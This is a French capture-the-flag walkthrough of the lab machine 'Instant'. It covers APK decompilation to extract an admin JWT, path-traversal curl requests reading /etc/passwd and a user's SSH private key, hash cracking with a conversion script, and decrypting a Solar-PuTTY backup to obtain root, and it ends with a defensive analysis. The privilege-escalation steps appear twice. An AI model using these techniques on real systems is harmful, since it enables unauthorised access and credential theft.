![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

## Énumération des services (Scanning)

Ma méthodologie débute par un scan **Nmap** complet pour identifier la surface d'attaque réseau.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.37

# Scan de services et scripts par défaut sur les ports identifiés
nmap -p 22,80 -sCV 10.10.11.37
```

Le scan révèle deux ports ouverts :
*   **22/tcp (SSH)** : OpenSSH 9.6p1.
*   **80/tcp (HTTP)** : Apache 2.4.58, redirigeant vers `http://instant.htb/`.

J'ajoute l'entrée correspondante dans mon fichier `/etc/hosts` :
```text
10.10.11.37 instant.htb
```

## Analyse de l'application Web et de l'APK

Le site `instant.htb` présente une application de change de monnaie. L'élément le plus critique identifié est un lien de téléchargement pour un fichier Android nommé **instant.apk**. 

### Reverse Engineering de l'APK
J'utilise **jadx-gui** pour décompiler et analyser le code source de l'application. Une recherche de chaînes de caractères (**String Search**) pour "instant.htb" révèle de nouveaux sous-domaines :
*   `mywalletv1.instant.htb` (API principale)
*   `swagger-ui.instant.htb` (Documentation API)

Je mets à jour mon fichier `/etc/hosts` :
```text
10.10.11.37 instant.htb mywalletv1.instant.htb swagger-ui.instant.htb
```

### Découverte du Hardcoded JWT
En inspectant la classe `com.instantlabs.instant.AdminActivities`, je découvre une fonction `TestAdminAuthorization` contenant un **JSON Web Token (JWT)** codé en dur :

```java
// Token Admin extrait du code source
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

L'analyse sur `jwt.io` confirme que ce token possède le rôle **Admin** et une date d'expiration extrêmement lointaine (année 3023).

## Analyse de l'API et Identification de la Vulnérabilité

Je me dirige vers `http://swagger-ui.instant.htb` pour explorer les points de terminaison de l'API. L'interface **Swagger UI** me permet de tester les requêtes en utilisant le token admin dans le header `Authorization`.

L'endpoint `/api/v1/admin/view/logs` renvoie un fichier nommé `1.log` situé dans le répertoire personnel de l'utilisateur **shirohige**.

> Schéma Mental :
> APK Analysis -> Hardcoded Admin JWT -> Swagger UI Access -> Admin API Endpoints -> Log Reading Function -> Potential Path Traversal.

### Exploitation du Path Traversal / Arbitrary File Read
Le point de terminaison `/api/v1/admin/read/log` prend un paramètre de nom de fichier. Je teste une injection de type **Directory Traversal** pour lire des fichiers sensibles.

```bash
# Vérification de la vulnérabilité via curl
curl -X 'GET' 'http://mywalletv1.instant.htb/api/v1/admin/read/log?file=../../../../etc/passwd' \
-H 'Authorization: <JWT_TOKEN>'
```

Le serveur est vulnérable et retourne le contenu de `/etc/passwd`. Je confirme la présence de l'utilisateur **shirohige**.

## Premier Shell : Accès SSH

Puisque l'application semble s'exécuter dans le contexte de l'utilisateur **shirohige**, je tente de lire sa clé privée SSH.

```bash
# Lecture de la clé SSH privée
curl -X 'GET' 'http://mywalletv1.instant.htb/api/v1/admin/read/log?file=../../../../home/shirohige/.ssh/id_rsa' \
-H 'Authorization: <JWT_TOKEN>'
```

L'API retourne la clé sous forme de liste JSON. Je la reformate proprement dans un fichier local.

```bash
# Nettoyage et configuration de la clé
nano id_rsa_shirohige
chmod 600 id_rsa_shirohige

# Connexion SSH
ssh -i id_rsa_shirohige shirohige@instant.htb
```

Je parviens à obtenir un shell stable en tant que **shirohige** et je peux lire le premier flag dans `user.txt`.

---

### Énumération Interne & Post-Exploitation

Une fois l'accès initial établi en tant que **shirohige** via **SSH**, j'entame une énumération locale pour identifier des vecteurs d'escalade. Le système est un **Ubuntu 24.04**.

L'exploration du répertoire personnel et des fichiers système révèle deux éléments critiques :
1.  **Base de données SQLite** : Située dans `~/projects/mywallet/Instant-Api/mywallet/instance/instant.db`. Elle contient les informations des utilisateurs de l'application.
2.  **Fichier de sauvegarde Solar-PuTTY** : Situé dans `/opt/backups/Solar-PuTTY/sessions-backup.dat`. **Solar-PuTTY** est un gestionnaire de sessions Windows dont les fichiers de configuration peuvent contenir des identifiants chiffrés.

```bash
# Extraction de la base de données pour analyse locale
scp -i id_rsa shirohige@instant.htb:~/projects/mywallet/Instant-Api/mywallet/instance/instant.db .

# Identification du fichier de backup Solar-PuTTY
ls -l /opt/backups/Solar-PuTTY/sessions-backup.dat
```

---

### Analyse de la base de données & Extraction de Hashes

L'ouverture de `instant.db` avec **sqlite3** permet d'isoler la table `wallet_users`. Celle-ci contient des **PBKDF2 hashes** générés par le framework **Werkzeug** (Python).

```sql
-- Exploration des utilisateurs
sqlite3 instant.db
sqlite> .tables
sqlite> SELECT username, password FROM wallet_users;

-- Résultat :
-- shirohige | pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed
```

> **Schéma Mental : Pivot de mot de passe**
> L'objectif est de casser le hash de l'utilisateur actuel (`shirohige`). En cybersécurité, la réutilisation de mots de passe est fréquente. Si le mot de passe de l'utilisateur est "faible", il pourrait servir de clé de déchiffrement pour le fichier **Solar-PuTTY** trouvé précédemment.

---

### Escalade de Privilèges : Du User au Root

#### 1. Cracking du Hash Werkzeug
Le format de hash **Werkzeug** (`pbkdf2:sha256:iterations$salt$hash`) n'est pas nativement supporté par **Hashcat**. Il nécessite une conversion vers le format **PBKDF2-HMAC-SHA256** (Mode 10900).

```python
# Script de conversion rapide (Werkzeug -> Hashcat)
import base64, codecs
# Format : sha256:iterations:base64(salt):base64(binascii.unhexlify(hash))
print(f"sha256:600000:{base64.b64encode(b'YnRgjnim').decode()}:{base64.b64encode(codecs.decode('c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed', 'hex')).decode()}")
```

L'exécution de **Hashcat** sur le hash converti avec la liste **rockyou.txt** révèle le mot de passe : `estrella`.

```bash
hashcat -m 10900 converted_hash.txt /usr/share/wordlists/rockyou.txt
```

#### 2. Déchiffrement de Solar-PuTTY
Le fichier `sessions-backup.dat` est chiffré. En utilisant le mot de passe `estrella` comme clé, je peux extraire les sessions enregistrées. J'utilise l'outil **SolarPuttyCracker** (ou **SolarPuttyDecrypt** via **Mono**).

> **Schéma Mental : Extraction de secrets**
> Le fichier de backup contient un objet JSON chiffré. Une fois la clé trouvée, le déchiffrement expose les attributs `Username` et `Password` des sessions SSH enregistrées par l'administrateur.

```bash
# Utilisation de SolarPuttyCracker
python3 SolarPuttyCracker.py sessions-backup.dat -p estrella
```

Le résultat affiche une entrée pour l'utilisateur **root** :
*   **Username** : `root`
*   **Password** : `12**24nzC!r0c%q12`

#### 3. Accès Root Final
Bien que l'accès direct en **SSH** pour **root** soit généralement désactivé (`PermitRootLogin no`), le mot de passe permet de s'authentifier via la commande `su` depuis la session `shirohige`.

```bash
shirohige@instant:~$ su -
Password: 12**24nzC!r0c%q12
root@instant:~# id
uid=0(root) gid=0(root) groups=0(root)
```

L'escalade est complète. Le vecteur final reposait sur une **Credential Reuse** (réutilisation de mot de passe) entre l'application web et la protection d'un fichier de configuration tiers.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois le shell obtenu en tant que **shirohige**, j'entame une phase d'énumération locale approfondie pour identifier des vecteurs d'escalade. Le système tourne sous **Ubuntu 24.04**, une version récente qui limite les exploits de noyau classiques.

#### Énumération du Système de Fichiers & Bases de Données
Dans le répertoire personnel de l'utilisateur, je localise le code source de l'API **Flask**. En explorant le dossier `instance/`, je découvre une base de données **SQLite** nommée `instant.db`.

```bash
# Extraction de la base de données pour analyse locale
scp -i id_rsa shirohige@instant.htb:~/projects/mywallet/Instant-Api/mywallet/instance/instant.db .

# Analyse des tables et des hashes
sqlite3 instant.db "SELECT username, password FROM wallet_users;"
```

La table `wallet_users` contient des hashes générés par le framework **Werkzeug** (`pbkdf2:sha256:600000$...`). Je note également la présence d'un fichier inhabituel dans `/opt` : `/opt/backups/Solar-PuTTY/sessions-backup.dat`.

> **Schéma Mental :**
> L'attaque repose sur une corrélation de données : 
> 1. Extraire les hashes de l'application web.
> 2. Casser le hash de l'utilisateur actuel (**shirohige**).
> 3. Utiliser ce mot de passe comme clé de déchiffrement pour un backup **Solar-PuTTY** trouvé sur le disque, lequel contient probablement les identifiants **Root**.

#### Crack des identifiants Werkzeug
Le format de hash de **Werkzeug** n'est pas nativement supporté par **Hashcat** dans sa forme brute. Il nécessite une conversion vers le mode `10900` (**PBKDF2-HMAC-SHA256**).

```python
# Script de conversion Werkzeug vers Hashcat (format sha256:iterations:salt:pass)
import base64, codecs, re

h = "pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed"
m = re.match(r'pbkdf2:sha256:(\d*)\$([^\$]*)\$(.*)', h)
print(f"sha256:{m.group(1)}:{base64.b64encode(m.group(2).encode()).decode()}:{base64.b64encode(codecs.decode(m.group(3), 'hex')).decode()}")
```

Après conversion, je lance **Hashcat** avec la liste **rockyou.txt** :
```bash
hashcat -m 10900 hash_converted.txt /usr/share/wordlists/rockyou.txt
```
Le mot de passe de **shirohige** est identifié : `estrella`.

#### Déchiffrement de Solar-PuTTY
**Solar-PuTTY** est un gestionnaire de sessions tiers. Ses fichiers de configuration et de backup sont chiffrés, mais des recherches (notamment les travaux de **VoidSec**) montrent que si un mot de passe utilisateur est réutilisé pour protéger la base de données des sessions, celle-ci peut être déchiffrée.

J'utilise l'outil **SolarPuttyCracker** (ou le binaire C# original via **Mono**) pour extraire les secrets du fichier `.dat`.

```bash
# Déchiffrement du fichier de session avec le mot de passe trouvé
python3 SolarPuttyCracker.py sessions-backup.dat -p estrella
```

L'outil extrait un objet JSON contenant les **Credentials** de la session nommée "Instant". Je récupère le mot de passe en clair pour l'utilisateur **root** : `12**24nzC!r0c%q12`.

#### Compromission Totale
Le service **SSH** restreint généralement l'accès direct à **root**. J'utilise donc `su` depuis ma session actuelle.

```bash
shirohige@instant:~$ su -
Password: 12**24nzC!r0c%q12
root@instant:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### Analyse Post-Exploitation "Beyond Root"

L'analyse de la machine **Instant** révèle plusieurs failles structurelles graves dans la gestion des secrets et le cycle de vie du développement (SDLC) :

1.  **Hardcoded Credentials dans l'APK** : La présence d'un **Admin JWT** avec une date d'expiration fixée à l'an 3023 dans le code source de l'application Android est une erreur critique. Cela démontre une absence de rotation des secrets et une confiance aveugle dans l'obfuscation du code client.
2.  **LFI via l'API d'administration** : L'endpoint `/api/v1/admin/read/log` souffrait d'une vulnérabilité de **Path Traversal**. L'absence de **Sandboxing** ou de **Chroot** pour le processus de l'API a permis de lire des fichiers sensibles comme `id_rsa`.
3.  **Credential Reuse & Insecure Backups** : Le vecteur final d'élévation de privilèges repose sur la réutilisation du mot de passe de l'application web pour protéger un fichier de backup tiers (**Solar-PuTTY**). De plus, stocker des fichiers de sessions contenant des mots de passe **root** dans un répertoire lisible par tous (`/opt/backups/`) est une violation flagrante du principe de moindre privilège.
4.  **Werkzeug Security** : Bien que les hashes **Werkzeug** soient robustes (PBKDF2), la faiblesse du mot de passe choisi (`estrella`) a permis un cassage hors-ligne rapide une fois la base **SQLite** exfiltrée.